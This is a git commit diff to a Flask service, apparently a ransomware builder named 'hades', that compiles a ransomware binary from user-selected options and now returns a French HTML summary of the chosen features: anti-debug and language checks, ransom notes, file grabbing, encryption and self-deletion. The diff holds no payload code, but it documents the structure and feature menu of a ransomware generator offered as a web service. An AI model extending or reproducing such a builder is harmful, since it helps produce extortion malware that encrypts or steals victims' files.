017c35a0c917efe0df0c2667063b44db6898dd34
Udo29 <udo.lijour@gmail.com>
2023-04-07 13:25:54 +0200

    add html summary

--- build/src/hades.py
+++ build/src/hades.py
@@ -104,18 +104,162 @@ def api_generate():
 
     makecmd = options.generateMake()
 
-    import sys
-
-    sys.stderr.write(" ".join(makecmd))
-    sys.stderr.flush()
+    html = create_html(options)
 
     process = subprocess.Popen(makecmd, stdout=subprocess.PIPE)
     status = process.wait()
 
     if not status:
-        return send_file("hades")
+        return {"file": send_file("hades"), "html": html}
     else:
         return Response(f"Error {status}: {process.stdout.readline()}", status=403)
+   
+def create_html(options: Options):
+
+    first = """
+    <!DOCTYPE html>
+<html>
+<head>
+<title>Résumé du ransomware</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+<style>
+body,h1,h2,h3,h4,h5 {font-family: "Raleway", sans-serif}
+</style>
+</head>
+<body class="w3-light-grey">
+
+<!-- w3-content defines a container for fixed size centered content, 
+and is wrapped around the whole page content, except for the footer in this example -->
+<div class="w3-content" style="max-width:1400px">
+
+<!-- Header -->
+<header class="w3-container w3-center w3-padding-32"> 
+  <h1><b>RANSOMWARE</b></h1>
+  <p>Résumé du <span class="w3-tag">ransomware</span> créé.</p>
+</header>
+
+<!-- Grid -->
+<div class="w3-row">
+
+<!-- Blog entries -->
+<div class="w3-col l8 s12">
+  <!-- Blog entry -->
+  <div class="w3-card-4 w3-margin w3-white">
+    <div class="w3-container">
+      <h3><b>DESCRIPTION</b></h3>
+      <h5>Courte description du ransomware créé.</h5>
+    </div>
+
+    <div class="w3-container">
+      <p>Voici les caractéristiques que vous avez choisi pour votre ransomware.
+        <ul>
+"""
+
+    mid = """
+    </ul>
+        <div class="w3-row">
+        <div class="w3-col m8 s12">
+          <p><button class="w3-button w3-padding-large w3-white w3-border"><b>THANKS</b></button></p>
+        </div>
+        <div class="w3-col m4 w3-hide-small">
+          <p><span class="w3-padding-large w3-right"><b>Comments  </b> <span class="w3-tag">0</span></span></p>
+        </div>
+      </div>
+    </div>
+  </div>
+  <hr>
+<!-- END BLOG ENTRIES -->
+</div>
+
+<!-- Introduction menu -->
+<div class="w3-col l4">
+ 
+  <!-- Labels / tags -->
+  <div class="w3-card w3-margin">
+    <div class="w3-container w3-padding">
+      <h4>Tags</h4>
+    </div>
+    <div class="w3-container w3-white">
+    <p>
+    """
+
+    end = """
+    </p>
+    </div>
+  </div>
+  
+<!-- END Introduction Menu -->
+</div>
+
+<!-- END GRID -->
+</div><br>
+
+<!-- END w3-content -->
+</div>
+
+<!-- Footer -->
+<footer class="w3-container w3-dark-grey w3-padding-32 w3-margin-top"></footer>
+
+</body>
+</html>
+    """
+
+    if options.SLEEP != None:
+        opt_sleep = "<li>SLEEP:</li>"
+        tag_sleep = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">SLEEP</span>'
+    else:
+        opt_sleep = ""
+        tag_sleep = ""
+    
+    if options.CHECK_DEBUG != None:
+        opt_debug = "<li>CHECK DEBUG:</li>"
+        tag_debug = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK DEBUG</span>'
+    else:
+        opt_debug = ""
+        tag_debug = ""
+    
+    if options.CHECK_LANGUAGE != None:
+        opt_language = "<li>CHECK LANGUAGE:</li>"
+        tag_language = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">CHECK LANGUAGE</span>'
+    else:
+        opt_language = ""
+        tag_language = ""
+
+    if options.ADD_NOTES != None:
+        opt_notes = "<li>ADD NOTES:</li>"
+        tag_notes = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ADD NOTES</span>'
+    else:
+        opt_notes = ""
+        tag_notes = ""
+
+    if options.GET_FILES != None:
+        opt_files = "<li>GET FILES:</li>"
+        tag_files = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">GET FILES</span>'
+    else:
+        opt_files = ""
+        tag_files = ""
+
+    if options.ENCRYPTION != None:
+        opt_encryption = "<li>ENCRYPTION:</li>"
+        tag_encryption = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">ENCRYPTION</span>'
+    else:
+        opt_encryption = ""
+        tag_encryption = ""
+
+    if options.AUTODELETE != None:
+        opt_autodelete = "<li>AUTODELETE:</li>"
+        tag_autodelete = '<span class="w3-tag w3-light-grey w3-small w3-margin-bottom">AUTODELETE</span>'
+    else:
+        opt_autodelete = ""
+        tag_autodelete = ""
+    
+    HTML = first + opt_sleep + opt_debug + opt_language + opt_notes + opt_files + opt_encryption + opt_autodelete + \
+    mid + tag_sleep + tag_debug + tag_language + tag_notes + tag_files + tag_encryption + tag_autodelete + end
+
+    return HTML
 
 if __name__ == "__main__":
     app.run(debug=True, port=80, host="0.0.0.0")
